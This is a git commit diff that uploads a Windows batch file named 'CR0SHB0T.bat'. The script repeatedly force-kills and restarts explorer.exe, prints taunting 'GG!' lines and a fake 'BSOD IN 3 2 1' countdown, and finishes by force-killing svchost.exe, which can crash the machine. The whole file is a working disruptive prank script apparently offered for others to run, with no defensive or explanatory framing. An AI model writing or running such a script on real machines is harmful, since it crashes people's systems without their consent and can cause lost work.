7e922ef804d34cf9290d757903d7ce0fdad1e4dd
kyrok638 <134541021+Arslanailaiti@users.noreply.github.com>
2024-02-01 16:20:50 +0100

    Add files via upload

---
+++ CR0SHB0T.bat
@@ -0,0 +1,70 @@
+@echo off
+
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+echo GG!
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+echo GG!
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+echo GG!
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+start explorer
+TASKKILL /IM explorer.exe /F
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo GG!
+echo BSOD IN
+echo 3
+echo 2
+echo 1
+echo GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! GG! 
+TASKKILL /IM svchost.exe /F
